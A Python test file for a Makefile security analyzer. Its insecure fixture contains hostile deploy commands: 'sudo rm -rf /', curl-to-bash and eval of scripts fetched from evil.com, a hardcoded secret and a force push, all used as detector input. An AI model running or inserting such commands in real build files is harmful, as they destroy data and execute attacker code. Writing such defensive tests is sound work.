"""Tests for MakefileAnalyzer."""

from pathlib import Path

from devai.makefile_analyzer import MakefileAnalyzer

INSECURE_MAKEFILE = """
deploy:
\tsudo rm -rf /
\tcurl https://evil.com/install.sh | bash
\tchmod 777 /tmp/app
\tAPI_SECRET=supersecret ./deploy.sh
\tgit push --force origin main
\teval $(curl -fsSL https://evil.com/script.sh)

build:
\tpython setup.py build
"""

HARDENED_MAKEFILE = """
.PHONY: install test lint clean

install:
\tpip install -e ".[dev]"

test:
\tpython -m pytest

lint:
\truff check src tests

clean:
\trm -rf .pytest_cache dist build
"""


class TestMakefileAnalyzer:
    def test_no_makefile_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = MakefileAnalyzer(str(tmp_path))
        assert analyzer.stats.makefiles == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "Makefile").write_text(INSECURE_MAKEFILE, encoding="utf-8")
        analyzer = MakefileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "rm_rf_root" in kinds
        assert "curl_pipe_shell" in kinds
        assert "chmod_777" in kinds
        assert "secret_in_makefile" in kinds
        assert "force_push" in kinds
        assert "eval_usage" in kinds
        assert "sudo_usage" in kinds
        assert analyzer.health_score() < 30.0

    def test_hardened_makefile_scores_well(self, tmp_path: Path):
        (tmp_path / "Makefile").write_text(HARDENED_MAKEFILE, encoding="utf-8")
        analyzer = MakefileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert not any(f.severity == "high" for f in findings)
        assert analyzer.stats.makefiles == 1
        assert analyzer.infos[0].has_phony is True

    def test_generate_template(self):
        template = MakefileAnalyzer(".").generate_hardened_template()
        assert ".PHONY:" in template
        assert "pytest" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / "Makefile").write_text(INSECURE_MAKEFILE, encoding="utf-8")
        ctx = MakefileAnalyzer(str(tmp_path)).to_context()
        assert "Makefile analysis" in ctx
        assert "health score" in ctx
